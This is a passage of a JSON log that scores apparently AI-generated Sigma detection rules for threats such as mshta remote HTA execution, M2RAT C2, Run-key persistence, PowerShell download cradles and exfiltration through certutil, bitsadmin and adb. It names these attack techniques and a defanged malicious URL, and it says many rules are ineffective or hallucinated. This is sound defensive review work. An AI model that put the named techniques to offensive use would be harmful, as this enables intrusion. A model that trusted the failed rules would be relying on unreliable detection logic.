        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Steganography Detection via JPEG with XOR Key",
        "rule_id": "a6e3dc28-f6bb-486c-b673-0b02f197cd5b",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Covers multiple execution vectors (certutil, PowerShell, generic process) for steganography detection",
          "Includes relevant MITRE ATT&CK tags for defense evasion and T1027",
          "Log source clearly defined with Sysmon process creation on Windows",
          "Acknowledges known false positives in documentation"
        ],
        "weaknesses": [
          "Failed to detect the target TTP in real-world verification (0 events found)",
          "Rule references 'wallup.net' in description but this domain is not present in detection logic or TTP information (hallucination)",
          "Generic selection condition may lead to elevated false positives",
          "No network connection condition despite mentioning 'network connections to wallup.net' in description",
          "No XOR key indicator in detection logic despite being central to the rule's premise"
        ],
        "suggestions": [
          "Add explicit detection logic for network connections to suspicious domains observed in the attack (if applicable)",
          "Include indicators such as XOR keys or specific command-line patterns associated with steganographic decoding",
          "Refine generic selection criteria to reduce false positives by adding context or additional conditions",
          "Align rule description with actual detection logic\u2014remove references to 'wallup.net' unless confirmed in TTP",
          "Re-test and validate rule against confirmed attack samples to improve detection coverage"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Execution of Remote HTA via mshta.exe",
        "rule_id": "c4f9cdf4-f707-4f6f-ad82-f3e52bf660bb",
        "quality_score": 0.675,
        "status": "fail",
        "strengths": [
          "The rule is focused on a specific and known malicious behavior (remote HTA execution via mshta.exe)",
          "Uses precise field matching with endswith and contains operators for reliable detection logic",
          "Includes relevant false positives in metadata, showing awareness of operational context",
          "Efficient detection logic with simple string matching that should perform well in most SIEMs"
        ],
        "weaknesses": [
          "Rule failed to detect the actual attack in real-world verification (0 events found), indicating poor detection coverage",
          "Contains a hardcoded malicious URL (hxxps://www.*****elearning.or[.]kr/popup/handle/1.html) not present in the TTP information, suggesting potential hallucination or overfitting to a single campaign",
          "Highly specific URL makes the rule brittle and unlikely to detect variations of the same technique",
          "Lack of TTP ID and tactic in the target TTP reduces confidence in alignment with real adversary behavior"
        ],
        "suggestions": [
          "Generalize the detection logic to include patterns indicative of remote HTA execution (e.g., http[s] URLs in mshta command lines) rather than hardcoding a single URL",
          "Use threat intelligence feeds or domain reputation checks to identify suspicious remote sources dynamically",
          "Validate rule logic against known adversary TTPs and ensure alignment with MITRE ATT&CK technique T1218.005 (MSHTA)",
          "Test and verify rules against representative attack simulations before deployment",
          "Replace hardcoded indicators with behavioral patterns to improve coverage and longevity"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Autorun Registration via RUN Key Command",
        "rule_id": "791d0625-fdbb-4197-91a2-8b2cdebbc446",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Clear focus on detecting persistence via Run key modifications using common tools (reg.exe and PowerShell)",
          "Uses specific command-line indicators like 'add' and 'Set-ItemProperty' which are strong signals of intent",
          "Includes relevant MITRE ATT&CK tags (T1547.001) for autorun persistence",
          "Well-structured detection logic with distinct selections for different tools",
          "Acknowledges realistic false positives such as software installers and admin scripts"
        ],
        "weaknesses": [
          "Failed to detect any real-world events during verification, indicating poor detection coverage in practice",
          "Relies solely on command-line patterns that may be easily bypassed (e.g., obfuscated PowerShell or alternative tools)",
          "Does not cover other common methods of Run key modification (e.g., WMI, remote registry tools)",
          "No validation of registry path specificity \u2014 'Run' string match could trigger on benign keys containing 'Run' in name",
          "TTP ID is marked as 'unknown' and lacks full MITRE context (e.g., tactic missing)"
        ],
        "suggestions": [
          "Enhance detection logic to include Sysmon Event ID 12/13 (RegistryEvent) for direct registry modifications, not just process creation",
          "Add path filtering to ensure only known Run keys (e.g., *\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run*) are matched",
          "Include additional process images like wmic.exe, cmd.exe, or remote execution tools that may modify Run keys",
          "Improve command-line pattern matching with regex to reduce false positives (e.g., require full command syntax)",
          "Leverage behavioral chains \u2014 correlate with file creation or network activity to increase confidence",
          "Update TTP metadata with correct MITRE tactic (e.g., 'Persistence') and valid technique ID"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "M2RAT C2 Communication via POST to log.php",
        "rule_id": "a64cb143-9544-4b88-8ad6-1560e7a831f5",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets known command-and-control behavior using specific command-line patterns",
          "Log source is appropriate for the detection (Sysmon process creation)",
          "Includes relevant MITRE ATT&CK tags for context (T1071, T1105)",
          "Performance is efficient with sub-second query execution time"
        ],
        "weaknesses": [
          "Rule failed to detect any real-world events despite verification attempt",
          "Detection logic appears too narrow, relying on hardcoded paths like '/popup/handle/log.php' which may not reflect actual M2RAT C2 traffic",
          "Potential hallucination: rule references '/popup/handle/log.php' and parameters 'R or U', but TTP description does not confirm these specifics",
          "High false positive risk due to legitimate scripts using PowerShell/cmd with similar command lines"
        ],
        "suggestions": [
          "Broaden detection logic to include more generic indicators of M2RAT C2, such as POST requests to PHP endpoints with base64-encoded parameters",
          "Validate IOCs (paths, parameters) against known threat intelligence reports on M2RAT",
          "Add network-based detection criteria (e.g., outbound HTTP POST to suspicious domains) to complement process creation",
          "Include additional process images beyond powershell.exe and cmd.exe that could be used for C2 (e.g., certutil, mshta)",
          "Implement thresholding or behavioral chaining to reduce false positives (e.g., multiple failed connections followed by success)"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exfiltration of PC and Mobile Data via Command-Line Tools",
        "rule_id": "30472f21-100c-45ac-ae61-fd8ab894d515",
        "quality_score": 0.775,
        "status": "pass",
        "strengths": [
          "The rule successfully detected 2 events in real-world verification, confirming its effectiveness in identifying the targeted exfiltration behavior.",
          "Covers multiple exfiltration vectors (PowerShell, certutil, bitsadmin, adb), increasing detection breadth.",
          "Includes relevant false positives in metadata, showing awareness of operational impact.",
          "Uses precise conditions with Image and CommandLine filtering, reducing noise.",
          "Aligned with MITRE ATT&CK techniques T1041 and T1020 for exfiltration."
        ],
        "weaknesses": [
          "Some command-line indicators (e.g., 'http', 'https' in bitsadmin) are broad and may trigger on legitimate traffic.",
          "adb.exe usage may be rare in non-development environments, limiting applicability.",
          "No use of parent-child process context (e.g., powershell spawned from unusual process) to strengthen signal.",
          "Relies on command-line arguments which can be obfuscated (e.g., encoded commands, argument splitting)."
        ],
        "suggestions": [
          "Add process ancestry checks (e.g., parent process not explorer.exe or svchost.exe) to increase confidence.",
          "Tune bitsadmin detection to require both /transfer and a remote URL pattern to reduce FP.",
          "Consider adding file path conditions (e.g., temp directory usage) to support malicious intent.",
          "Enhance with file creation or network connection correlation to confirm exfiltration flow.",
          "Update TTP ID if known; currently marked as 'unknown'."
        ],
        "metrics": {
          "accuracy": 0.9,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Steganography Tool Execution Detection",
        "rule_id": "6c2d2b68-f7c8-4430-abcf-aa6002700ae1",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule covers multiple tools commonly associated with steganography, increasing breadth of detection.",
          "Uses specific command-line arguments and file extensions that are indicative of steganographic activity.",
          "Log source is well-defined (Sysmon process creation on Windows), ensuring reliable data inputs.",
          "False positives are thoughtfully documented, showing awareness of operational impact."
        ],
        "weaknesses": [
          "Rule failed to detect any events in real-world verification, indicating poor practical efficacy.",
          "Detection logic may be too narrow (e.g., exact string matches) to catch obfuscated or alternative command-line usage.",
          "No use of regular expressions or case-insensitive matching, increasing bypass risk.",
          "Relies on exact tool names and paths, which attackers can easily modify (e.g., renaming binaries)."
        ],
        "suggestions": [
          "Enhance detection logic with case-insensitive and regex-based patterns to capture obfuscation.",
          "Add behavioral correlation, such as file creation after encoding or network activity post-decoding.",
          "Include additional indicators like child processes of suspicious tools or access to sensitive files.",
          "Consider adding file entropy analysis or MIME type mismatches as supplemental signals.",
          "Validate rule against known steganography attack datasets (e.g., MITRE ATT&CK evaluations) to improve coverage."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "PowerShell Execution with Suspicious Commands",
        "rule_id": "a3bf9179-53c7-4f84-b32c-3bc32f5ea862",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets known suspicious PowerShell command-line patterns associated with malicious activity, such as encoded commands and web requests.",
          "Condition logic combines multiple detection paths (encoded, download, remote execution) with parent process context (cmd.exe), increasing contextual relevance.",
          "False positives are reasonably documented, acknowledging common legitimate use cases like admin scripts and installers.",
          "The rule uses efficient string matching on key fields (Image, CommandLine, ParentImage) which supports fast querying in most SIEMs."
        ],
        "weaknesses": [
          "The rule failed to detect any events in the real-world verification test (0/0), indicating poor practical detection coverage despite theoretical relevance.",
          "Relies on broad CommandLine keywords (e.g., 'DownloadFile', 'IWR') that may miss obfuscated or alternative syntax used by adversaries.",
          "The condition requires the parent process to be cmd.exe, which may exclude legitimate attack chains launched from other parents (e.g., explorer.exe, wscript.exe).",
          "No use of regular expressions or case-insensitive matching, increasing the risk of evasion via casing or spacing variations."
        ],
        "suggestions": [
          "Improve detection logic by adding case-insensitive matching and regex patterns to catch obfuscated commands (e.g., 'DownloadFile' vs 'downloadfile' or 'D*ownload*File').",
          "Expand parent process selection to include other common launchers (e.g., wscript, mshta, office apps) or make it optional based on higher-risk command patterns.",
          "Incorporate additional indicators such as command length, base64 patterns, or network connections in follow-up rules to reduce reliance on keyword matching.",
          "Re-test and validate the updated rule against real attack data to confirm detection capability before deployment."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Compress Files with WinRAR for Exfiltration",
        "rule_id": "16cc1a9c-355a-4886-821c-850cc8e668aa",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and relevant behavior associated with data exfiltration preparation: compression of sensitive file types using WinRAR",
          "Includes a focused list of file extensions commonly associated with documents, media, and email, which increases relevance to data theft scenarios",
          "Uses Sysmon process creation data, which is reliable and widely available in enterprise environments",
          "Condition logic is straightforward and efficient, using simple string matching on Image and CommandLine fields"
        ],
        "weaknesses": [
          "Rule failed to detect any real-world attack events (0/0), indicating poor detection coverage in practice",
          "Relies on hardcoded path \\rar.exe and specific %TEMP%\\Y_ pattern which may be easily bypassed by attackers using different paths or naming",
          "No verification that the TTP involves WinRAR or rar.exe; the tool may not be used in the actual attack, leading to potential hallucination",
          "The CommandLine|contains approach for file extensions could trigger on benign strings within commands (e.g., 'txt' in 'text') leading to false positives"
        ],
        "suggestions": [
          "Enhance detection logic to include other archiving tools (e.g., 7z, zip, PowerShell Compress-Archive) to improve coverage",
          "Use regex or word boundaries when matching file extensions in command lines to reduce false positives",
          "Validate the use of WinRAR in the actual TTP context; if not confirmed, generalize the rule to detect archive tool usage broadly",
          "Add process command-line structure analysis (e.g., 'a -r' for archive recursive) to better distinguish malicious compression from incidental string matches",
          "Conduct threat intel or red team validation to confirm whether the attack actually uses WinRAR before relying on tool-specific detection"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "M2RAT Malware Use of Shared Memory for Command and Control",
        "rule_id": "b059e8f6-aff3-4994-86ef-68f5d1c741d4",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "The rule targets a specific malware (M2RAT) and a relevant behavioral indicator (shared memory usage) associated with command and control",
          "Includes reasonable false positive exclusions in documentation, acknowledging legitimate use of shared memory",
          "Uses Sysmon process creation logs, which are rich for behavioral detection",
          "Condition logic is simple and clear, combining direct malware naming with behavioral pattern"
        ],
        "weaknesses": [
          "Rule failed to detect any real-world events (0/0), indicating poor detection coverage or mismatch with actual TTPs",
          "No TTP ID or MITRE ATT&CK technique mapping provided in rule (\"unknown\"), reducing traceability",
          "The behavioral indicators (e.g., 'CreateFileMapping', 'SharedMemory') are generic strings likely not present in actual command lines",
          "High risk of false negatives due to reliance on hardcoded strings not typically used in real malware command lines",
          "Potential hallucination: Rule references 'M2RAT' and specific command-line artifacts without confirmation they appear in real-world samples"
        ],
        "suggestions": [
          "Replace generic string matching in CommandLine with more realistic indicators (e.g., suspicious image paths, known M2RAT IOCs, or specific memory section names)",
          "Add MITRE ATT&CK ID (e.g., T1573, T1095) for better alignment and completeness",
          "Improve detection logic by incorporating additional telemetry (e.g., network connections post-process creation, named pipe creation)",
          "Validate rule against real or simulated M2RAT activity to ensure it triggers on actual behavior",
          "Consider using sigma rule testing frameworks (e.g., SigmaVM, Splunk Attack Range) for verification before deployment"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Potential Keylogging Activity by M2RAT or Similar Tools",
        "rule_id": "3992f9b9-adc8-4599-b63c-36b3c013c38b",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets known indicators of keylogging activity, such as 'keylog' in file or command line, which can be effective for broad detection.",
          "Includes multiple detection paths (M2RAT, filename, rundll32, cmd) increasing potential coverage across different execution methods.",
          "Well-documented false positives, showing awareness of potential benign triggers.",
          "Uses Sysmon process creation logs, which are rich and reliable for behavioral detection."
        ],
        "weaknesses": [
          "Rule failed to detect any real-world events during verification, indicating poor practical efficacy.",
          "Relies heavily on string matching (e.g., 'keylog') which attackers can easily obfuscate or avoid.",
          "No use of file hash, parent-child process relationships, or other behavioral context to strengthen detection.",
          "Mentions M2RAT but does not include additional known indicators (e.g., command line arguments, child processes, network activity) for that specific threat."
        ],
        "suggestions": [
          "Enhance detection logic with additional behavioral indicators such as suspicious parent processes (e.g., Office apps spawning rundll32 with keylog DLLs).",
          "Incorporate file signature checks or hash lookups for known malicious binaries if available.",
          "Use regular expressions to detect obfuscation (e.g., 'k3yl0g', 'key\\s*log') to improve resilience against simple evasion.",
          "Add network connection or file creation follow-up events to increase confidence and reduce false positives.",
          "Validate rule against real attack data or emulate the TTP to ensure detection capability before deployment."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Steganographic JPEG File Creation Detected via Known Hash",
        "rule_id": "a936ff05-9c37-4a0f-b5ae-232f1c4da1f3",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Specific detection logic targeting known steganographic file via MD5 hash",
          "Clear and relevant false positive exclusions documented",
          "Efficient condition using direct field matching (endswith, contains)",
          "Well-structured Sigma format with proper tags and metadata"
        ],
        "weaknesses": [
          "Rule failed to detect the attack in real-world verification (0 events found)",
          "Over-reliance on a single static hash makes the rule brittle and easily evaded",
          "No contextual enrichment (e.g., process, user, command line) to distinguish malicious from benign use",
          "Potential for false negatives due to lack of broader pattern matching"
        ],
        "suggestions": [
          "Expand detection logic to include multiple known steganographic file hashes",
          "Add process context (e.g., ImageMagick, steghide) to increase specificity",
          "Incorporate behavioral indicators such as file modification timing or unusual parent-child process chains",
          "Use YARA or ML-based file analysis to detect steganography patterns beyond known hashes",
          "Regularly update hash list from threat intelligence feeds to maintain relevance"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Infostealer Binary Execution Detected",
        "rule_id": "74011aae-bac4-425d-a3b1-f20a86e98952",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "High specificity due to SHA256 hash matching, minimizing false positives",
          "Clear and concise detection logic focused on a known malicious binary",
          "Well-documented false positive considerations"
        ],
        "weaknesses": [
          "Failed to detect the attack in real-world verification (0 events found)",
          "Overly specific to a single hash, limiting coverage to only one variant",
          "Lack of TTP alignment (TTP ID and tactic are 'unknown', reducing contextual relevance)",
          "Rule may not generalize to similar infostealers or polymorphic variants"
        ],
        "suggestions": [
          "Enhance detection logic with additional indicators (e.g., command-line arguments, parent-child process relationships)",
          "Incorporate behavioral patterns beyond hash matching (e.g., file creation, network connections)",
          "Validate rule against multiple samples of the same malware family to improve coverage",
          "Ensure TTP mapping is complete (tactic, technique ID) for better threat context",
          "Consider using file signature or YARA-like pattern matching to detect variants"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.8,
          "maintainability": 0.9
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Persistence via Run Registry Key Execution",
        "rule_id": "f15901e3-9627-43f5-84bc-41efb34e6a65",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets known persistence mechanisms via the HKCU Run registry key, which is a common technique used by adversaries",
          "Includes detection of suspicious command-line patterns such as 'cmd.exe /c PowerShell.exe' and the presence of the 'RyPO' indicator, which may indicate malicious behavior",
          "Uses Sysmon process creation logs, which provide detailed visibility into process execution and command-line arguments",
          "Acknowledges legitimate use cases in false positives list, showing awareness of operational environment impact"
        ],
        "weaknesses": [
          "The rule failed to detect any events during real-world verification (0/0), indicating poor detection coverage against the targeted TTP",
          "The TTP ID is listed as 'unknown' and the tactic field is empty, reducing confidence in alignment with MITRE ATT&CK",
          "The 'RyPO' indicator appears to be a potential hallucination or custom artifact not commonly associated with known threats; no external validation or source provided",
          "Relies on specific command-line artifacts that may be easily obfuscated by attackers"
        ],
        "suggestions": [
          "Improve detection coverage by aligning the rule more precisely with documented behaviors from MITRE ATT&CK T1053 (Scheduled Task/Job), including additional command-line patterns or image paths",
          "Validate and document the origin of the 'RyPO' indicator; if not widely observed, consider removing or replacing it with more common IOCs",
          "Enhance the rule with additional conditions such as parent-child process relationships or command-line obfuscation detection to reduce bypass potential",
          "Consider adding data from other sources (e.g., registry events via Sysmon Event ID 12/13) to improve fidelity and coverage",
          "Retest the updated rule against real attack data to confirm detection capability and adjust thresholds accordingly"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Steganography Embedded in HTTP POST Requests",
        "rule_id": "05640071-2b35-4a21-af95-a1197dd77b4a",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets multiple common tools (PowerShell, curl, Python, wget) that could be used for malicious HTTP POST requests, increasing breadth.",
          "The use of Sysmon process creation logs provides good visibility into command-line activity, which is critical for detecting this type of behavior.",
          "False positives are thoughtfully considered and documented, showing awareness of legitimate use cases.",
          "The rule is simple and efficient in structure, making it performant in query execution."
        ],
        "weaknesses": [
          "The rule failed to detect any events in real-world verification (0/0), indicating poor detection coverage against the actual TTP.",
          "Reliance on the literal keyword 'steganography' in the command line is highly brittle and easily bypassed (e.g., obfuscation, synonyms, encoding).",
          "The TTP 'Data Obfuscation' is broad and not specifically tied to HTTP POST or steganography; the rule may be misaligned with the intended technique.",
          "No network-layer correlation (e.g., HTTP logs, proxy data) is included, limiting detection context and increasing reliance on command-line artifacts alone."
        ],
        "suggestions": [
          "Enhance detection logic to look for behavioral patterns (e.g., base64-encoded payloads, unusual POST sizes, rare destinations) rather than relying on literal keyword matches.",
          "Incorporate network telemetry (e.g., proxy or firewall logs) to correlate process execution with actual HTTP POST traffic containing suspicious content.",
          "Use regular expressions or entropy-based detection to identify obfuscated or encoded data in command lines or network payloads.",
          "Broaden the rule to detect other forms of data hiding (e.g., DNS tunneling, image uploads with metadata) under the same TTP to improve coverage.",
          "Validate and refine the rule using red team or synthetic attack data that simulates real steganography-based C2 techniques."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "PowerShell Execution with Potentially Malicious Arguments",
        "rule_id": "8bc85a57-eace-4e23-9577-6d676ea8f33f",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Covers multiple common malicious PowerShell patterns (encoded commands, web requests, file downloads, IEX usage)",
          "Uses precise field targeting with Sysmon process creation data",
          "Includes relevant MITRE ATT&CK tagging for T1059.001",
          "Acknowledges known false positives in documentation"
        ],
        "weaknesses": [
          "Failed to detect the targeted attack in real-world verification (0 events found)",
          "Rule may be too broad by matching 'IEX' as a substring, which can appear in benign contexts",
          "No case-insensitive matching applied (e.g., 'iex' vs 'IEX') which could lead to evasion",
          "Relies on exact string matches without normalization or regex for argument variations"
        ],
        "suggestions": [
          "Use case-insensitive string matching (e.g., |contains-i or regex) for command line arguments",
          "Refine 'IEX' detection to avoid substring matches by checking for full token matches or surrounding whitespace/syntax",
          "Incorporate additional indicators such as command line length, base64 entropy, or presence of suspicious URLs",
          "Validate rule logic against actual attack data to improve detection coverage",
          "Consider adding a preprocessing step to normalize command lines (e.g., unquote, trim) before evaluation"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation for Client Execution via Malicious HWP or EPS Files (CVE-2017-8291)",
        "rule_id": "b3ad483c-bc60-4c9f-a13d-d86f5af37557",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets specific file types (.hwp, .eps) associated with the CVE-2017-8291 exploit, aligning with known attack patterns.",
          "Uses process creation events via Sysmon, which is a reliable data source for detecting execution chains.",
          "Includes multiple detection paths (cmd, PowerShell, rundll32), increasing breadth of coverage for different exploitation methods.",
          "Well-documented false positives, showing awareness of legitimate edge cases."
        ],
        "weaknesses": [
          "Failed to detect any real-world attack instances (0/0 events found), indicating poor detection coverage in practice.",
          "Relies on hardcoded filenames like 'Form.hwp' and '.eps' which are easily changed by attackers, reducing reliability.",
          "The condition referencing 'CVE-2017-8291' in the command line is unrealistic\u2014attackers rarely include CVE identifiers in payloads.",
          "No use of file hash, parent-child process relationships, or other behavioral indicators to strengthen detection logic."
        ],
        "suggestions": [
          "Replace hardcoded filenames with generic patterns (e.g., '*.hwp', '*.eps') and combine with suspicious execution contexts.",
          "Add context such as parent process (e.g., Word, browser) spawning cmd/powershell with HWP/EPS files.",
          "Incorporate file creation or network events to build a multi-stage detection logic.",
          "Remove the 'CVE-2017-8291' string match\u2014it's not realistic in real attacks and adds noise.",
          "Validate rule logic using red team emulation data to ensure it detects actual exploit behaviors."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "PowerShell Execution with Hidden, NoLogo, NonInteractive, and ExecutionPolicy Bypass",
        "rule_id": "e2362985-abdc-4629-afe5-24a51647c127",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a well-defined and commonly abused combination of PowerShell command-line arguments associated with malicious behavior.",
          "Detection logic is based on specific and observable indicators (e.g., -WindowStyle hidden, -ep bypass) that are highly relevant to attacker tradecraft.",
          "Rule includes documented false positives, showing awareness of operational environment nuances.",
          "Uses precise Sysmon process creation logging, which is standard in mature Windows environments."
        ],
        "weaknesses": [
          "The rule failed to detect any real-world attack events (0/0), indicating poor detection coverage in practice.",
          "Highly specific condition requiring all four flags simultaneously may miss variants where only a subset is used.",
          "Relies on exact string matching which may fail if arguments are case-varied, spaced differently, or obfuscated.",
          "No evidence of TTP alignment validation beyond generic tagging; TTP ID is marked as 'unknown'."
        ],
        "suggestions": [
          "Modify the detection logic to use an OR-based condition for individual flags and layer with behavioral context (e.g., parent process, network connection) to improve coverage.",
          "Use case-insensitive matching (e.g., |icontains) for command-line arguments to reduce evasion via casing.",
          "Add support for argument variations (e.g., -ExecutionPolicy Bypass, -ep Bypass, /ep:bypass) to increase robustness.",
          "Validate rule against known adversary emulation plans using the full T1059.001 test suite to ensure real-world efficacy.",
          "Consider breaking this into multiple rules: one for high-fidelity combinations (high threshold) and another for broader single-flag detection (low threshold) to balance sensitivity and precision."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious PowerShell Execution Indicative of Persistence",
        "rule_id": "0b312009-ea21-41aa-95b6-a8e7914e7334",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets high-risk PowerShell behaviors commonly associated with persistence mechanisms",
          "Uses Sysmon process creation logs which provide detailed command-line visibility",
          "Covers multiple persistence techniques (encoded commands, scheduled tasks, service creation) in a single rule",
          "Includes relevant MITRE ATT&CK tagging for T1059.001 (PowerShell)",
          "Well-structured detection logic with clear, modular selections"
        ],
        "weaknesses": [
          "Failed to detect any real-world events despite verification attempt, indicating poor detection coverage in practice",
          "High potential for false positives due to lack of filtering on legitimate administrative activity",
          "Rule relies solely on command-line keywords without contextual enrichment (e.g., parent process, user context)",
          "No exclusion logic for known benign tools or scripts",
          "Detection logic may miss obfuscated or polymorphic variants of the same techniques"
        ],
        "suggestions": [
          "Enhance detection logic with additional context such as parent process (e.g., wscript, mshta), user account (SYSTEM vs. user), or image path",
          "Add exclusions for known legitimate administrative tools or signed scripts",
          "Incorporate behavioral thresholds or time-based anomalies to reduce false positives",
          "Validate rule against real attack datasets (e.g., Atomic Red Team) to improve detection efficacy",
          "Consider splitting into multiple rules with different severity levels based on risk level of each technique"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious PowerShell Execution with Encoded Commands",
        "rule_id": "595a57b1-134d-4513-b363-298743bec018",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets known malicious PowerShell command-line patterns commonly used in attacks, such as '-enc', 'IEX', and 'Invoke-WebRequest'.",
          "Includes parent-child process detection (powershell.exe spawned from cmd.exe), which adds context and improves detection of suspicious execution chains.",
          "Well-documented false positives, showing awareness of legitimate use cases in enterprise environments.",
          "Uses Sysmon process creation logs, which provide rich telemetry for this type of detection."
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events during verification (0/0), indicating poor detection coverage against the intended TTP.",
          "Broad CommandLine keyword matching may lead to false positives, especially with legitimate automation tools using terms like 'Invoke-WebRequest' or 'DownloadFile'.",
          "No use of case-insensitive matching explicitly (though Sigma backends may handle this), increasing risk of evasion via casing variation.",
          "Relies on exact string matches without considering obfuscation techniques (e.g., variable substitution, concatenation)."
        ],
        "suggestions": [
          "Improve detection logic by adding case-insensitive matching (e.g., using '|icontains') for command-line keywords to prevent simple evasion.",
          "Add additional context such as command-line length thresholds or presence of base64-encoded strings to increase confidence.",
          "Incorporate additional indicators such as PowerShell logging (Module Logging, Script Block Logging) to reduce reliance on process command lines alone.",
          "Tune the rule to exclude known legitimate management tools by adding exceptions (e.g., specific parent processes like SCCM agents).",
          "Re-test the rule against real attack data or simulated payloads that use encoded commands to validate detection capability before deployment."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detect CMD Execution via Shared Memory",
        "rule_id": "703c2d55-5de9-4893-977f-696bdc567108",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and potentially malicious behavior (cmd.exe with shared memory indicators)",
          "Log source is well-defined using Sysmon process creation events",
          "False positives are thoughtfully documented, showing awareness of operational impact",
          "Rule uses simple and efficient conditions (endswith, contains) that are performant in most SIEMs"
        ],
        "weaknesses": [
          "Rule failed to detect the attack in real-world verification (0 events found), indicating poor detection coverage",
          "The 'shared' string in CommandLine is too generic and may miss actual TTPs or rely on literal text not used in real attacks",
          "No specific TTP ID or tactic provided in rule or target, reducing traceability to MITRE ATT&CK",
          "Detection logic may be based on a hallucinated or oversimplified assumption (no evidence that real attacks use 'shared' in command line)"
        ],
        "suggestions": [
          "Refine detection logic using known adversary command lines from threat intel (e.g., specific tools like 'cmd /c echo ... | \\\\pipe\\\\...' or named pipes)",
          "Use more specific indicators such as named pipe patterns, IPC artifacts, or parent-child process anomalies",
          "Incorporate additional context like command line arguments, parent process, or image path to reduce ambiguity",
          "Validate rule against real attack datasets (e.g., Atomic Red Team tests) to improve detection fidelity",
          "Update rule metadata with correct MITRE ATT&CK ID (e.g., T1059.003 for Windows Command Shell) and tactic (Execution)"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Execution of Known Trojan Binary by Hash",
        "rule_id": "ca323d94-ab85-45a5-924e-016f3b318f29",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets process creation events with Sysmon, which is appropriate for detecting execution of malicious binaries",
          "Uses a specific hash string associated with known malware activity, increasing specificity",
          "Includes both Image and CommandLine fields in detection logic, broadening coverage of potential execution methods",
          "Clearly documents false positives, showing awareness of potential operational impact"
        ],
        "weaknesses": [
